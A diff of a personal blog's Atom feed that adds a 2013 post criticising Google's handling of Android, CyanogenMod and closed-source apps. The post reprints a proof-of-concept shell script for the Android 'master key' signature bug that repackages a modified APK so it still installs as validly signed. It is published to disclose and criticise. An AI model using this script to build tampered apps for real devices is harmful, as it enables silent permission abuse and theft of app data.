@@ -4,7 +4,7 @@
   <title><![CDATA[Dario's coredump]]></title>
   <link href="http://berdario.github.io/atom.xml" rel="self"/>
   <link href="http://berdario.github.io/"/>
-  <updated>2013-12-25T14:59:50+01:00</updated>
+  <updated>2014-01-16T06:07:49+01:00</updated>
   <id>http://berdario.github.io/</id>
   <author>
     <name><![CDATA[Dario Bertini]]></name>
@@ -12,6 +12,152 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Let down by Google's Android]]></title>
+    <link href="http://berdario.github.io/blog/2013/12/24/let-down-by-googles-android/"/>
+    <updated>2013-12-24T23:56:00+01:00</updated>
+    <id>http://berdario.github.io/blog/2013/12/24/let-down-by-googles-android</id>
+    <content type="html"><![CDATA[<p>Originally I wanted to write another post, akin to &ldquo;Cyanogenmod is a ghetto&rdquo;. In fact I wasn&rsquo;t really fond of that project and, until now, with my android phone (a Nexus S) I chose to stick to the stock android version (I experienced cyanogenmod and others aftermarket mods with my previous phone: an HTC Dream, the very first android device).</p>
+
+<p>I never really liked the xda-developers forums either: a lot of OSS projects have their own forum, but for development a Mailing List (or similar) is preferred. The advantages are obvious: you get to reuse your identity (email), you don&rsquo;t have to deal with wonky cookie-based session authentication, you don&rsquo;t have to deal with bulky signatures/animated gifs/etc. (as long as you don&rsquo;t render html and/or enforce the netiquette) and everyone keeps a copy of the old discussions (thus, if the server and its backup disks get corrupted you won&rsquo;t completely lose your project history).</p>
+
+<p>In fact, at the beginning I remember developers complaining about the &ldquo;cooking&rdquo; mindset: building your homebrew android versions wasn&rsquo;t supposed to be like taking binaries and stuff them together without really knowing how the whole system worked (this was probably more common during the Windows Mobile 6 roms era). Most people on xda in fact were quite new to linux: I remember asking there (or in other places, like some irc channels) why the preferred filesystem for app2sd was ext2 instead of ext3/4&hellip; but the answer I got was just that journaling &ldquo;wasn&rsquo;t needed&rdquo; for a mobile device (nevermind the fact that even mobile devices can get turned off abruptly, or just think about the long check process that android does when it starts up to detect corruption on the sd/external memory). Needless to say: the conventional wisdom changed.</p>
+
+<p>Maybe for the same reason, when I asked about a <a href="https://en.wikipedia.org/wiki/Vanilla_software">vanilla</a> Android rom I was told that there was no such thing as vanilla. At the time I thought that maybe it was just because there was indeed no such build available (but still, it seemed strange that no-one would take the AOSP sources and made it available as an image ready-to-install), but after I realized that it might have been quite likely that the very idea of a &ldquo;vanilla&rdquo; version, might have been foreign to them&hellip; unbeknownst of the dangers of balkanization for the several android roms that sprouted out.</p>
+
+<p>Also, due to the fact that end-users (who never flashed a firmware before in their life) and developers hanged around in the same forums, I remember that people could get frustrated and hostile to the users at times. Unfortunately, digging up posts from the xda-dev and cyanogenmod forums before summer 2009 seems quite hard.</p>
+
+<p>Another problem, was the <a href="http://android-developers.blogspot.it/2009/09/note-on-google-apps-for-android.html">handling of Google Apps</a>: imho it was obvious from the start that if someone is willingly licensing something to be used freely, the software that they haven&rsquo;t licensed so is probably important for them. But early modders probably didn&rsquo;t care, due to being accustomed of redistributing binaries in the old Windows Phone 6 days&hellip;</p>
+
+<p>I kept using my HTC Dream until early 2012, and while it was painful to use due to the small amount of memory, it was still usable with Cyanogenmod5 (running Android 2.1 aka Eclair). With Cyanogenmod6 (Android 2.2) instead, even if it was <a href="https://github.com/CyanogenMod/android_vendor_cyanogen/blob/froyo/CHANGELOG.mkdn#maintainers">still supported by Cyanogen himself</a>, there were some changes among the system apps, like the new Gallery that (due to its additional animations and increased memory requirements) was totally unusable on the Dream. Other than this, there were also some nasty sudden reboots when using the camera (but it was probably to be expected, since the camera firmware has almost never been open). This left me with a bitter taste, and I was not so sure anymore that the Cyanogenmod they shipped was actually used and tested day-to-day by the developers (not for the older models, at least).</p>
+
+<p>Between an up-to-date device that&rsquo;s so slow as to be unusable, and a device that&rsquo;s some versions behind, I chose to just use the latter. Up until then, I coveted the latest Android version, but let&rsquo;s look at the facts: There were some truly important and interesting improvements with the earlier versions:</p>
+
+<ul>
+<li>1.5 3rd party keyboards, widgets, better bluetooth, copypaste in the browser, animations, autorotation, etc.</li>
+<li>1.6 Search (also with voice) through contacts and more, TTS, camera improvements&hellip;</li>
+<li>2.0 Multiple accounts sync, browser improvements, live wallpapers, etc.</li>
+<li>2.2 JIT, USB &amp; Wi-fi tethering, Market batch updates, native app2sd, etc.</li>
+</ul>
+
+
+<p>But with the latest versions, I don&rsquo;t feel such a need for the new features. I&rsquo;m not saying that changes in the later Android version aren&rsquo;t interesting, for example I appreciated the multiple user accounts support in 4.2 and 4.3. But if you weren&rsquo;t an Android user before 2.2, just try to imagine how it would&rsquo;ve been not to be able to update all the dozen (or more!) of applications that requested an update&hellip; Or to resort to rooting just to get tethering or app2sd working.</p>
+
+<p>In the meanwhile, though I didn&rsquo;t &ldquo;need&rdquo; Cyanogenmod anymore, it has improved: the controversial idea of rooting your device <a href="http://www.cyanogenmod.org/blog/security-and-you">has been reevaluated</a> (is subverting the android security model a good idea? <a href="https://github.com/ChainsDD/Superuser/">&ldquo;How does the SU app really work?&rdquo;</a> I find it slightly worrying that there&rsquo;s no wiki on the official project and aside from stackoverflow.com it&rsquo;s difficult to find information on it)</p>
+
+<p>I&rsquo;ve also heard that they&rsquo;re planning to fix the <a href="https://android-review.googlesource.com/22694">building keys detail</a> and the Cyanogenmod Inc. project (aside from <a href="https://plus.google.com/+GuillaumeLesniak/posts/L8FJkrcahPs">some brouhaha</a> ) seems like good news.</p>
+
+<p>So, I&rsquo;m not a fan of Cyanogenmod (though I&rsquo;ll go back to using it now, probably), but here I actually wanted to talk about what disappointed me with Google&rsquo;s Android management recently:</p>
+
+<p>To better understand the issue, you might want to have a look at <a href="http://nelenkov.blogspot.de/2013/05/code-signing-in-androids-security-model.html">this explanation of the Android security model</a>. Briefly: Apk signatures are checked with a TOFU (Trust On First Use) model and there is no centralized CA model.</p>
+
+<p><a href="https://www.codeaurora.org/cgit/quic/la/platform/libcore/commit/?h=jb_2.5.6&amp;id=c5af994b579b404cb0e501e7e20b5427493d66f7">13th of February 2013 a fix was pushed</a> to an internal Google repository. <a href="http://bluebox.com/corporate-blog/bluebox-uncovers-android-master-key/">The issue it fixed was not publicly known until early July</a>, but as of 11th of July Google still didn&rsquo;t merge the patch into the AOSP.</p>
+
+<p>You&rsquo;ll notice that the first link isn&rsquo;t from AOSP: I got the link by asking on the Cyanogenmod irc channel, and that is where Cyanogen got the patch from (it probably was just by luck that this commit was publicly available). That was subsequently <a href="https://jira.cyanogenmod.org/browse/CYAN-1602">merged into Cyanogenmod 10.1</a>.</p>
+
+<p>This irks me already: Google receive news of a security vulnerability and has a solution for it, but decides to sit on it for 5 months? You&rsquo;d think that the wait serves for 3rd parties to have time to integrate it into their Android builds, test it and ship it; but as far as we know, OEMs aren&rsquo;t backporting security fixes from Google&rsquo;s internal repository. In fact the fix has been integrated only in devices that run at least Android 4.3.</p>
+
+<p>But the latest supported version for my Nexus S is Android 4.1, 32 months passed since the Nexus S launch, am I already at risk of widely known exploits for an unpatched bug? (Actually it&rsquo;s even worse: the latest update shipped October 2012, less than 2 years since the device launch)</p>
+
+<p>Google would like for us to think otherwise <a href="http://arstechnica.com/security/2013/07/google-patches-critical-android-threat-as-working-exploit-is-unleashed/">[1]</a> <a href="http://arstechnica.com/security/2013/08/researchers-find-trojanized-banking-app-that-exploits-critical-android-bug/">[2]</a>. Sure they can fix part of the issue server side on the Play Store, but what about Android at-large? What about apps installed outside the market? They&rsquo;re more common than you might think: just realize that some devices don&rsquo;t ship with the Google Apps and that several alternative stores exists (F-Droid, Amazon&rsquo;s, even the Humble Bundle App works as an app store even if you cannot buy directly from it). The cornerstone for bringing relief to otherwise unsupported devices seems to be the Google Verification Tool.</p>
+
+<p>Unfortunately, it doesn&rsquo;t protect from this security hole at all. I have no clue why is that, but it&rsquo;s quite easy to reproduce: You just have to take an android package, decompile it and repackage it like <a href="http://blog.apkudo.com/2012/10/16/reverse-engineering-android-disassembling-hello-world/">this post</a> instructs you to do (it even has a link to an already-built HelloWorld apk, so you don&rsquo;t even have to write Java code to test it) and instead of rebuilding the apk straight away, follow the instructions as laid out in this <a href="https://gist.github.com/poliva/36b0795ab79ad6f14fd8">POC shell script</a> (or just execute it):</p>
+
+<figure class='code'><figcaption><span> (android-apk-poc.sh)</span> <a href='http://berdario.github.io/downloads/code/android-apk-poc.sh'>download</a></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="c">#!/bin/bash</span>
+</span><span class='line'><span class="c"># PoC for Android bug 8219321 by @pof</span>
+</span><span class='line'><span class="c"># +info: https://jira.cyanogenmod.org/browse/CYAN-1602</span>
+</span><span class='line'><span class="k">if</span> <span class="o">[</span> -z <span class="nv">$1</span> <span class="o">]</span>; <span class="k">then </span><span class="nb">echo</span> <span class="s2">&quot;Usage: $0 &lt;file.apk&gt;&quot;</span> ; <span class="nb">exit </span>1 ; <span class="k">fi</span>
+</span><span class='line'><span class="nv">APK</span><span class="o">=</span><span class="nv">$1</span>
+</span><span class='line'>rm -r out out.apk tmp 2&gt;/dev/null
+</span><span class='line'>java -jar apktool.jar d <span class="nv">$APK</span> out
+</span><span class='line'><span class="c">#apktool d $APK out</span>
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;Modify files, when done type &#39;exit&#39;&quot;</span>
+</span><span class='line'><span class="nb">cd </span>out
+</span><span class='line'>bash
+</span><span class='line'><span class="nb">cd</span> ..
+</span><span class='line'>java -jar apktool.jar b out out.apk
+</span><span class='line'><span class="c">#apktool b out out.apk</span>
+</span><span class='line'>mkdir tmp
+</span><span class='line'><span class="nb">cd </span>tmp/
+</span><span class='line'>unzip ../<span class="nv">$APK</span>
+</span><span class='line'>mv ../out.apk .
+</span><span class='line'>cat &gt;poc.py <span class="s">&lt;&lt;-EOF</span>
+</span><span class='line'><span class="s">#!/usr/bin/python</span>
+</span><span class='line'><span class="s">import zipfile </span>
+</span><span class='line'><span class="s">import sys</span>
+</span><span class='line'><span class="s">z = zipfile.ZipFile(sys.argv[1], &quot;a&quot;)</span>
+</span><span class='line'><span class="s">z.write(sys.argv[2])</span>
+</span><span class='line'><span class="s">z.close()</span>
+</span><span class='line'><span class="s">EOF</span>
+</span><span class='line'>chmod 755 poc.py
+</span><span class='line'><span class="k">for </span>f in <span class="sb">`</span>find . -type f |egrep -v <span class="s2">&quot;(poc.py|out.apk)&quot;</span><span class="sb">`</span> ; <span class="k">do</span> ./poc.py out.apk <span class="s2">&quot;$f&quot;</span> ; <span class="k">done</span>
+</span><span class='line'>cp out.apk ../evil-<span class="nv">$APK</span>
+</span><span class='line'><span class="nb">cd</span> ..
+</span><span class='line'>rm -rf tmp out
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;Modified APK: evil-$APK&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then, make sure that the Google Verification Tool is enabled (before 4.2 you have to open a separate application called Google Settings, you&rsquo;ll find a checkbox under Verify Apps) and you should find that your hacked apk installs just fine. (Actually, I got GVT to error on me when trying to install legitimate packages from F-Droid, so I&rsquo;m really skeptical about its real-world usefulness)</p>
+
+<p>You should&rsquo;ve already realized it by now, but it might be worth repeating: this would permit an attacker to silently reuse permission granted to a legitimate application, or steal data that was stored by it, without the user being the wiser.</p>
+
+<p>This is the last straw that made me wary of Google management, but it&rsquo;s not the first time I&rsquo;ve been dissatisfied by it: <a href="http://arstechnica.com/gadgets/2013/10/googles-iron-grip-on-android-controlling-open-source-by-any-means-necessary/">this article</a> clearly exposes the problem:
+Replacing open source applications with closed source ones. I felt it especially with the transition to Hangouts: it made it impossible to message your contacts on federated XMPP servers, it superseded GTalk which was mostly open source afaik and it broke Hangouts inside the G+ app if you tried to downgrade it to GTalk. Along with GTalk, the Search app, Music, Calendar, Keyboard, among others have been superseded by their closed-source equivalent.</p>
+
+<p>Sure, the code of the old app is still available (it&rsquo;s what <a href="https://chatsecure.org/">ChatSecure</a> has been built on if I&rsquo;m not mistaken), but if nobody is using and developing the code it&rsquo;ll likely bitrot. Also it won&rsquo;t be featured anymore on the builds that have represented the true stock Android experience until now: the builds that were shipped on Nexus devices that is.</p>
+
+<p>Slowly it&rsquo;s hijacking the perception of what actually Android is. A true vanilla AOSP build without Google apps might soon be unusable for someone trained on Google devices.</p>
+
+<p>So, Android is Open Source, and I&rsquo;m grateful for that&hellip; I&rsquo;ve always thought that the critiques of the Google Code dump releases as not being truly-open were quite shallow, given that the competition was much worse (that is, not open source at all, no sideloading of apps, not Linux friendly, no freely available developer tools). I certainly wished for a more open engagement with the community, but it seemed good enough.</p>
+
+<p>I don&rsquo;t know if the open source contenders (Ubuntu phone, Jolla Sailfish and FirefoxOS) will succeed, and I realize that the security updates mismanagement that I&rsquo;m blaming Google for can actually have some partial explanations with the way that software deploy is done on such devices.</p>
+
+<p>(I talked recently with developers for Ubuntu phone, and they told me that the idea of shipping a huge image that contains both feature updates and security updates, and doing it &ldquo;late&rdquo; is due to user experience and usability requirements: testing is paramount and users don&rsquo;t want to apply system updates too often&hellip; I&rsquo;m not 100% persuaded, but surely it&rsquo;s a case for having an as-smallest-as-possible core system)</p>
+
+<p>But if we actually have some freedom in this mobile platform, we have to exercise it. We have to test where the boundaries are and realize where they are. Has Google an unfair competitive advantage with the Google Apps licensing? Given the proprietary model, even if it has not, it&rsquo;s possible in the future for them to make it so. Do you even have <a href="https://en.wikipedia.org/wiki/The_Free_Software_Definition#The_definition">Freedom 0</a> if Google doesn&rsquo;t allow the redistribution of the Google apps? (I&rsquo;m using the FSF idea of freedom: I don&rsquo;t completely agree with Richard Stallman, but I find his definition of software freedom useful for bringing forth discussion)</p>
+
+<p>Using Android without Google apps (thus without even the Play store or the APIs) would make it clear when to get your work done you have to go through proprietary software, and force you into a platform that you couldn&rsquo;t  build/recreate yourself. If only as an experiment, I think I&rsquo;ll try it soon, but it&rsquo;s obvious how avoiding the use of the market can be troublesome.</p>
+
+<p>In fact, even some very OSS-friendly developers and applications <a href="https://github.com/WhisperSystems/TextSecure/issues/127">don&rsquo;t ship outside the Play store</a> (but luckily <a href="http://www.cyanogenmod.org/blog/whisperpush-secure-messaging-integration">Cyanogenmod will bundle this particular application</a>). The reasons are somewhat complex: Moxie objects to the key handling of the F-Droid project and the requirement for enabling 3rd party sources, but it seems that the main reason that is blocking that bug is guaranteeing updates and having crash reporting (which could be solved from inside TextSecure).</p>
+
+<p>While on the front of removing the sideloading requirement, an <a href="https://gitorious.org/f-droid/fdroidclient/merge_requests/37">effort is currently underway</a> to get F-Droid running as a system app (possible when rooting or bundling it into your image), thus hopefully the future for a truly open Android is not so bleak.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Windows disk woes]]></title>
@@ -48,7 +194,7 @@
 
 <p>To make this even worse, if you look at the contents, you&rsquo;ll see that there&rsquo;s some duplication: XboxLIVEGames, at least 3 copies of ZuneMusic, etc.</p>
 
-<p>Apparently Windows8 &ldquo;helpfully&rdquo; stores old versions of all your metro apps, doesn&rsquo;t let you see the disk footprint of these, and doesn&rsquo;t even give you an easy to access way to purge these old programs from the system.</p>
+<p>Apparently Windows8 &ldquo;helpfully&rdquo; stores old versions of all your metro apps, doesn&rsquo;t let you see the disk footprint of these, doesn&rsquo;t let you change the installation folder and doesn&rsquo;t even give you an easy to access way to purge these old programs from the system.</p>
 
 <p>(Things might have changed in the meanwhile, especially with the release of 8.1, but as you can guess, updating to 8.1 when Windows leaves so few disk space available is not really feasible: all Windows version upgrade usually cannot use a second disk as cache for the files to be installed, thus it requires at least twice the disk space that will be used for the installed system)</p>
 
